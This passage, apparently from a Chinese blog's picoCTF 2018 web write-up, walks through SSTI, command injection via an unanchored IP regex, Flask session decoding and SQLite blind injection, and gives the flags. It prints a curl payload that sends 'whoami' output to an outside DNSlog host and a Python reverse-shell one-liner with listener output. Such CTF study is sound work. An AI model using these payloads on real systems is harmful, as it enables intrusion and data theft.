/%</span><br></pre></td></tr></table></figure>\n<p>返回一个302，并且带有一个<code>cookie</code>，用这个<code>cookie</code>再访问一次<code>/</code>，得到flag。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 请求</span></span><br><span class=\"line\">GET / HTTP/1.1</span><br><span class=\"line\">HOST:flag.local</span><br><span class=\"line\">cookie:real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D;</span><br><span class=\"line\"><span class=\"comment\"># 返回</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">x-powered-by: Express</span><br><span class=\"line\">content-type: text/html; charset=utf-8</span><br><span class=\"line\">content-length: 438</span><br><span class=\"line\">etag: W/<span class=\"string\">&quot;1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg&quot;</span></span><br><span class=\"line\">date: Mon, 15 Oct 2018 17:10:13 GMT</span><br><span class=\"line\">connection: close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;html&gt;</span><br><span class=\"line\">\t\t\t&lt;head&gt;</span><br><span class=\"line\">\t\t\t\t&lt;link rel=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/css&quot;</span> href=<span class=\"string\">&quot;main.css&quot;</span> /&gt;</span><br><span class=\"line\">\t\t\t&lt;/head&gt;</span><br><span class=\"line\">\t\t\t&lt;body&gt;</span><br><span class=\"line\">\t\t\t\t&lt;header&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;div class=<span class=\"string\">&quot;user&quot;</span>&gt;Real Business Employee&lt;/div&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;a href=<span class=\"string\">&quot;/logout&quot;</span>&gt;Logout&lt;/a&gt;</span><br><span class=\"line\">\t\t\t\t&lt;/header&gt;</span><br><span class=\"line\">\t\t\t\t&lt;main&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today<span class=\"string\">&#x27;s flag is: &lt;code&gt;picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14&#125;&lt;/code&gt;.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t&lt;/main&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t%</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<p>flag:<code>picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14&#125;</code></p>\n<h1 id=\"flaskcards\">Flaskcards<a title=\"#flaskcards\" href=\"#flaskcards\"></a></h1>\n<h2 id=\"question-10\">Question<a title=\"#question-10\" href=\"#question-10\"></a></h2>\n<blockquote>\n<p>We found this fishy <a href=\"http://2018shell1.picoctf.com:23547/\" target=\"_blank\">website</a> for flashcards that we think may be sending secrets. Could you take a look?</p>\n</blockquote>\n<h3 id=\"hint-10\">Hint<a title=\"#hint-10\" href=\"#hint-10\"></a></h3>\n<blockquote>\n<p>Are there any common vulnerabilities with the backend of the website?</p>\n<p>Is there anywhere that filtering doesn’t get applied?</p>\n<p>The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user</p>\n</blockquote>\n<h2 id=\"solution-10\">Solution<a title=\"#solution-10\" href=\"#solution-10\"></a></h2>\n<p>从题目名字推测网站用的应该是flask框架，根据hint来看应该是SSTI漏洞。</p>\n<p>访问http://2018shell1.picoctf.com:23547/2，并没有返回特殊的数据，说明网站错误机制应该没有问题，切入点不在这。注册账号并登陆，发现多了<code>Creating cards</code>、<code>Listing cards</code>。</p>\n<p>在<code>Creating cards</code>的Question和answer处输入*2*，然后切换到<code>Listing Cards</code>，发现两处都变成了2而不是1。</p>\n<p>读取 <em>config.items()</em>，发现<code>secretkey</code>就是flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dict_items([(&#39;DEBUG&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;SQLALCHEMY_POOL_TIMEOUT&#39;, None), (&#39;JSON_AS_ASCII&#39;, True),</span><br><span class=\"line\">(&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;ENV&#39;, &#39;production&#39;), (&#39;SQLALCHEMY_POOL_RECYCLE&#39;, None), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)),</span><br><span class=\"line\">(&#39;JSON_SORT_KEYS&#39;, True), (&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None),</span><br><span class=\"line\">(&#39;MAX_COOKIE_SIZE&#39;, 4093), (&#39;USE_X_SENDFILE&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;, None),</span><br><span class=\"line\">(&#39;APPLICATION_ROOT&#39;, &#39;&#x2F;&#39;), (&#39;BOOTSTRAP_USE_MINIFIED&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;, True),</span><br><span class=\"line\">(&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;TESTING&#39;, False), (&#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&#39;, False),</span><br><span class=\"line\">(&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SQLALCHEMY_POOL_SIZE&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;),</span><br><span class=\"line\">(&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;SESSION_COOKIE_SAMESITE&#39;, None),</span><br><span class=\"line\">(&#39;JSONIFY_MIMETYPE&#39;, &#39;application&#x2F;json&#39;), (&#39;SQLALCHEMY_RECORD_QUERIES&#39;, None), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(0, 43200)),</span><br><span class=\"line\">(&#39;SQLALCHEMY_NATIVE_UNICODE&#39;, None), (&#39;SQLALCHEMY_BINDS&#39;, None), (&#39;SQLALCHEMY_DATABASE_URI&#39;, &#39;sqlite:&#x2F;&#x2F;&#39;), (&#39;SQLALCHEMY_ECHO&#39;, False),</span><br><span class=\"line\">(&#39;BOOTSTRAP_SERVE_LOCAL&#39;, False), (&#39;BOOTSTRAP_CDN_FORCE_SSL&#39;, False),</span><br><span class=\"line\">(&#39;SECRET_KEY&#39;, &#39;picoCTF&#123;secret_keys_to_the_kingdom_584f8327&#125;&#39;),</span><br><span class=\"line\">(&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;SQLALCHEMY_MAX_OVERFLOW&#39;, None)])</span><br></pre></td></tr></table></figure>\n<p>flag:<code>picoCTF&#123;secret_keys_to_the_kingdom_584f8327&#125;</code></p>\n<h1 id=\"fancy-alive-monitoring\">fancy-alive-monitoring<a title=\"#fancy-alive-monitoring\" href=\"#fancy-alive-monitoring\"></a></h1>\n<h2 id=\"question-11\">Question<a title=\"#question-11\" href=\"#question-11\"></a></h2>\n<blockquote>\n<p>One of my school mate developed an alive monitoring tool. Can you get a flag from <a href=\"http://2018shell1.picoctf.com:31070/\" target=\"_blank\">http://2018shell1.picoctf.com:31070</a>(<a href=\"http://2018shell1.picoctf.com:31070/\" target=\"_blank\">link</a>)?</p>\n</blockquote>\n<h3 id=\"hint-11\">Hint<a title=\"#hint-11\" href=\"#hint-11\"></a></h3>\n<blockquote>\n<p>This application uses the validation check both on the client side and on the server side, but the server check seems to be inappropriate.</p>\n<p>You should be able to listen through the shell on the server.</p>\n</blockquote>\n<h2 id=\"solution-11\">Solution<a title=\"#solution-11\" href=\"#solution-11\"></a></h2>\n<p>查看源码，输入处有js检查，表单处有正则检查。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">\t&lt;title&gt;Monitoring Tool&lt;&#x2F;title&gt;</span><br><span class=\"line\">\t&lt;script&gt;</span><br><span class=\"line\">\tfunction check()&#123;</span><br><span class=\"line\">\t\tip &#x3D; document.getElementById(&quot;ip&quot;).value;</span><br><span class=\"line\">\t\tchk &#x3D; ip.match(&#x2F;^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$&#x2F;);</span><br><span class=\"line\">\t\tif (!chk) &#123;</span><br><span class=\"line\">\t\t\talert(&quot;Wrong IP format.&quot;);</span><br><span class=\"line\">\t\t\treturn false;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\tdocument.getElementById(&quot;monitor&quot;).submit();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;h1&gt;Monitoring Tool ver 0.1&lt;&#x2F;h1&gt;</span><br><span class=\"line\">\t&lt;form id&#x3D;&quot;monitor&quot; action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return false;&quot;&gt;</span><br><span class=\"line\">\t&lt;p&gt; Input IP address of the target host</span><br><span class=\"line\">\t&lt;input id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot; type&#x3D;&quot;text&quot;&gt;</span><br><span class=\"line\">\t&lt;&#x2F;p&gt;</span><br><span class=\"line\">\t&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;Go!&quot; onclick&#x3D;&quot;check()&quot;&gt;</span><br><span class=\"line\">\t&lt;&#x2F;form&gt;</span><br><span class=\"line\">\t&lt;hr&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$ip &#x3D; $_POST[&quot;ip&quot;];</span><br><span class=\"line\">if ($ip) &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; super fancy regex check!</span><br><span class=\"line\">\tif (preg_match(&#39;&#x2F;^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])&#x2F;&#39;,$ip)) &#123;</span><br><span class=\"line\">\t\texec(&#39;ping -c 1 &#39;.$ip, $cmd_result);</span><br><span class=\"line\">\t\tforeach($cmd_result as $str)&#123;</span><br><span class=\"line\">\t\t\tif (strpos($str, &#39;100% packet loss&#39;) !&#x3D;&#x3D; false)&#123;</span><br><span class=\"line\">\t\t\t\tprintf(&quot;&lt;h3&gt;Target is NOT alive.&lt;&#x2F;h3&gt;&quot;);</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t&#125; else if (strpos($str, &#39;, 0% packet loss&#39;) !&#x3D;&#x3D; false)&#123;</span><br><span class=\"line\">\t\t\t\tprintf(&quot;&lt;h3&gt;Target is alive.&lt;&#x2F;h3&gt;&quot;);</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\techo &quot;Wrong IP Format.&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;hr&gt;</span><br><span class=\"line\">&lt;a href&#x3D;&quot;index.txt&quot;&gt;index.php source code&lt;&#x2F;a&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>js检查可以直接忽略，关键看正则过滤。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$ip</span>) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// super fancy regex check!</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&#x27;</span>,<span class=\"variable\">$ip</span>)) </span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>正则结尾没有写<code>$</code>，所以ip后面可以插入任意字符。页面没有命令回显，就可以用DNSlog查看命令执行返回的信息。</p>\n<p>输入 <code>ip=0.0.0.0;curl http://40zqma.ceye.io/`whoami` </code> 发现可以收到回显。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175950-63292d3c-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>也可以直接反弹shell，更方便。使用python来反弹shell。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip=0.0.0.0;python -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your_vps_ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>在vps上开启nc监听。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~ nc -lvvp 8888</span><br><span class=\"line\">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class=\"line\">Connection from [18.224.157.204] port 8888 [tcp/*] accepted (family 2, sport 42170)</span><br><span class=\"line\">/bin/dash: 0: can<span class=\"string\">&#x27;t access tty; job control turned off</span></span><br><span class=\"line\"><span class=\"string\">$ ls</span></span><br><span class=\"line\"><span class=\"string\">index.php</span></span><br><span class=\"line\"><span class=\"string\">index.txt</span></span><br><span class=\"line\"><span class=\"string\">the-secret-1335-flag.txt</span></span><br><span class=\"line\"><span class=\"string\">xinet_startup.sh</span></span><br><span class=\"line\"><span class=\"string\">$ cat the-secret-1335-flag.txt</span></span><br><span class=\"line\"><span class=\"string\">Here is your flag: picoCTF&#123;n3v3r_trust_a_b0x_d7ad162d&#125;</span></span><br></pre></td></tr></table></figure>\n<p>flag:<code>picoCTF&#123;n3v3r_trust_a_b0x_d7ad162d&#125;</code></p>\n<h1 id=\"help-me-reset-2\">Help Me Reset 2<a title=\"#help-me-reset-2\" href=\"#help-me-reset-2\"></a></h1>\n<h2 id=\"question-12\">Question<a title=\"#question-12\" href=\"#question-12\"></a></h2>\n<blockquote>\n<p>There is a website running at <a href=\"http://2018shell1.picoctf.com:19054/\" target=\"_blank\">http://2018shell1.picoctf.com:19054</a> (<a href=\"http://2018shell1.picoctf.com:19054/\" target=\"_blank\">link</a>). We need to get into any user for a flag!</p>\n</blockquote>\n<h3 id=\"hint-12\">Hint<a title=\"#hint-12\" href=\"#hint-12\"></a></h3>\n<blockquote>\n<p>Try looking past the typical vulnerabilities. Think about possible programming mistakes.</p>\n</blockquote>\n<h2 id=\"solution-12\">Solution<a title=\"#solution-12\" href=\"#solution-12\"></a></h2>\n<p>查看源码，发现有一处注释。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--Proudly maintained by zambrano--&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后跳到登录页面，只有登录和找回密码功能。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017180008-6e025f94-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>点击忘记密码。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017180022-7621bc1a-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>这里应该用到的就是源码里出现的用户名，输入并点击重置密码。有密保问题。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017180035-7e3b1bda-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>抓包发现一段<code>session</code>。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017180047-84dc216e-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>是flask的session，用<a href=\"https://github.com/noraj/flask-session-cookie-manager\" target=\"_blank\">解码工具</a>解一下试试。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flask-session-cookie-manager git/master</span><br><span class=\"line\">❯ python session_cookie_manager.py decode -c <span class=\"string\">&quot;.eJw9jd0OgjAMRl_F9HoX-JNFeRUlpECBxW01XQlRwru7XejVab-059ugX0QoKtQwMg9g4MUpuc4T1PdfNJNwRs-epRAl4JOgMSBumrXteSmGysCSSNoBFaHe4KDF8cHQCcYisOeLPV1vR1uBycfr7JRy3KEGjHlQfnN-NTCKo5S5Ou8dhvSI0Ox5FY7Tv23_Ar8wPVk.DqhNVw.Kz2YnbgDvhKMVlu7OgioYaSBPpU&quot;</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;current&quot;</span>:<span class=\"string\">&quot;food&quot;</span>,<span class=\"string\">&quot;possible&quot;</span>:[<span class=\"string\">&quot;food&quot;</span>,<span class=\"string\">&quot;hero&quot;</span>,<span class=\"string\">&quot;color&quot;</span>,<span class=\"string\">&quot;carmake&quot;</span>],<span class=\"string\">&quot;right_count&quot;</span>:0,<span class=\"string\">&quot;user_data&quot;</span>:&#123;<span class=\"string\">&quot; t&quot;</span>:[<span class=\"string\">&quot;zambrano&quot;</span>,<span class=\"string\">&quot;6346289160&quot;</span>,0,<span class=\"string\">&quot;white&quot;</span>,<span class=\"string\">&quot;batman&quot;</span>,<span class=\"string\">&quot;toyota&quot;</span>,<span class=\"string\">&quot;fries&quot;</span>,<span class=\"string\">&quot;williams\\n&quot;</span>]&#125;,<span class=\"string\">&quot;wrong_count&quot;</span>:0&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>答案都在这个list里面，对照类型回答问题，回答三次后可以重置密码，重置后使用自己的密码登录，得到flag。</p>\n<p>flag:<code>picoCTF&#123;i_thought_i_could_remember_those_cb4afc2a&#125;</code></p>\n<h1 id=\"a-simple-question\">A Simple Question<a title=\"#a-simple-question\" href=\"#a-simple-question\"></a></h1>\n<h2 id=\"question-13\">Question<a title=\"#question-13\" href=\"#question-13\"></a></h2>\n<blockquote>\n<p>There is a website running at <a href=\"http://2018shell1.picoctf.com:2644/\" target=\"_blank\">http://2018shell1.picoctf.com:2644</a> (<a href=\"http://2018shell1.picoctf.com:2644/\" target=\"_blank\">link</a>). Try to see if you can answer its question.</p>\n</blockquote>\n<h3 id=\"hint-13\">Hint<a title=\"#hint-13\" href=\"#hint-13\"></a></h3>\n<p>No Hints.</p>\n<h2 id=\"solution-13\">Solution<a title=\"#solution-13\" href=\"#solution-13\"></a></h2>\n<p>注释里给出了源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- source code is in answer2.phps --&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><code>asnwer2.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\">  ini_set(<span class=\"string\">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class=\"line\">  ini_set(<span class=\"string\">&#x27;display_errors&#x27;</span>, <span class=\"string\">&#x27;On&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$answer</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;answer&quot;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$debug</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;debug&quot;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM answers WHERE answer=&#x27;<span class=\"subst\">$answer</span>&#x27;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;SQL query: &quot;</span>, htmlspecialchars(<span class=\"variable\">$query</span>), <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"variable\">$con</span> = <span class=\"keyword\">new</span> SQLite3(<span class=\"variable\">$database_file</span>);</span><br><span class=\"line\">  <span class=\"variable\">$result</span> = <span class=\"variable\">$con</span>-&gt;query(<span class=\"variable\">$query</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$row</span> = <span class=\"variable\">$result</span>-&gt;fetchArray();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"variable\">$answer</span> == <span class=\"variable\">$CANARY</span>)  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Your flag is: <span class=\"subst\">$FLAG</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">elseif</span> (<span class=\"variable\">$row</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>简单的sql盲注，没有任何过滤，写脚本跑或者用sqlmap跑都可以，但是要注意的是，如果用<code>like</code>注入的话是不区分大小写的，可以用区分大小写的<code>GLOB </code>。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> ascii_letters, digits</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">burp0_url = <span class=\"string\">&quot;http://2018shell2.picoctf.com:2644/answer2.php&quot;</span></span><br><span class=\"line\">burp0_headers = &#123;<span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class=\"string\">&quot;Accept&quot;</span>: <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>, <span class=\"string\">&quot;Accept-Language&quot;</span>: <span 